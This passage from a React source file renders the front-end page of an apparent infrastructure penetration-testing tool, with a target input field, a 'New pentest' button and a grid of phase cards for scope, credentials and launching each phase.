                            <Server className="size-5 text-primary" />
                        </div>
                        <div>
                            <h1 className="text-xl font-semibold">Infrastructure Pentest</h1>
                            <p className="text-sm text-muted-foreground">Infrastructure penetration testing</p>
                        </div>
                    </div>
                    <Button
                        className="gap-2 bg-blue-700 hover:bg-blue-800"
                        size="sm"
                        onClick={() => navigate('/flows/new')}
                    >
                        <Zap className="size-4" />
                        New pentest
                    </Button>
                </div>

                {/* Target input */}
                <div className="flex items-center gap-3 rounded-lg border bg-muted/30 px-4 py-2.5">
                    <Globe className="size-4 shrink-0 text-muted-foreground" />
                    <Input
                        className="h-7 border-0 bg-transparent p-0 text-sm shadow-none focus-visible:ring-0"
                        placeholder="Target: e.g. example.com or 10.0.0.0/24"
                        value={target}
                        onChange={(e) => setTarget(e.target.value)}
                    />
                </div>

                {/* Phase cards — 4 columns, 2 rows */}
                <div className="grid grid-cols-4 gap-4">
                    {PHASES.map((phase) => (
                        <PhaseCard
                            credentials={credentials}
                            disabled={false}
                            key={phase.id}
                            phase={phase}
                            scopeItems={phase.id === 'scoping' ? scopeItems : undefined}
                            onCredentialsChange={setCredentials}
                            onLaunch={() => handleLaunch(phase)}
                            onScopeChange={phase.id === 'scoping' ? setScopeItems : undefined}
                        />
                    ))}
                </div>

            </div>
        </>
    );
};

export default InfrastructurePentest;
